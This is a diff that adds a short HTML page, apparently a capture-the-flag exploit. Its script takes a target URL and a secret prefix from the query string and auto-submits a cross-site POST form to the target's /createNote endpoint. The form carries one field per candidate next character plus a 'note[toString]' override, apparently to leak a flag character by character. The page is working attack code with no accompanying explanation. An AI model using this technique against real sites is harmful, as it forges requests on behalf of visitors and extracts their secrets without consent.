@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+</head>
+
+<body>
+  <script>
+    const submit = (url, pairs) => {
+      const form = document.createElement("form");
+      form.action = url;
+      form.method = "post";
+      for (const [k, v] of pairs) {
+        const input = document.createElement("input");
+        input.name = k;
+        input.value = v;
+        form.appendChild(input);
+      }
+      document.body.appendChild(form);
+      form.submit();
+    };
+
+    const main = async () => {
+      const params = new URLSearchParams(location.search);
+      const url = decodeURIComponent(params.get("url"));
+      const prefix = decodeURIComponent(params.get("prefix"));
+      const chars = "}_0123456789abcdefghijklmnopqrstuvwxyz".split("");
+
+      const pairs = [];
+      for (const [i, c] of chars.entries()) {
+        pairs.push([`note[${i}]`, prefix + c]);
+      }
+      pairs.push(["note[toString]", "x"]);
+
+      submit(`${url}/createNote`, pairs);
+    };
+
+    main();
+  </script>
+</body>
